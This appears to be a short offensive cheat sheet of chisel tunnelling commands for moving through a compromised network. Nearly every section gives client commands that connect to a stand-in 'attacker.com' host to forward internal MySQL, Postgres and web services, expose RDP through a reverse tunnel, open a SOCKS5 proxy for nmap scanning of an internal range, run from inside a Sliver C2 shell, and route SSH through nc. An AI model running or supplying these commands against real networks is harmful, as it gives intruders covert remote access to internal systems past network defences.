## Basic Local Port Forwarding
chisel server --port 8080
chisel client https://attacker.com:8080 -L 3306:database.internal:3306
mysql -h localhost -u admin -p -P 3306

## Reverse Tunnel
chisel server --port 8080
chisel client https://attacker.com:8080 -R 8888:localhost:3389
xfreerdp /u:admin /v:localhost:8888

## SOCKS5 Proxy
chisel server --port 8080
chisel client https://attacker.com:8080 -D 1080
proxychains4 nmap -sV 10.0.0.0/24

## Chained with C2
# In Sliver shell
> shell chisel client https://attacker.com:8080 -L 3306:db:3306 &

## Multi-Service Forwarding
chisel client https://attacker.com:8080 \
  -L 3306:db:3306 \
  -L 5432:postgres:5432 \
  -L 80:web:80

## SSH ProxyCommand
chisel client https://attacker.com:8080 -D 1080
# Add to ~/.ssh/config:
# Host internal-server
#   ProxyCommand nc -x localhost:1080 %h %p
ssh internal-server

## Credential-Protected Tunnel
chisel server --port 8080 -a admin:Password123
chisel client https://attacker.com:8080 --auth admin:Password123 -L 3000:localhost:3306
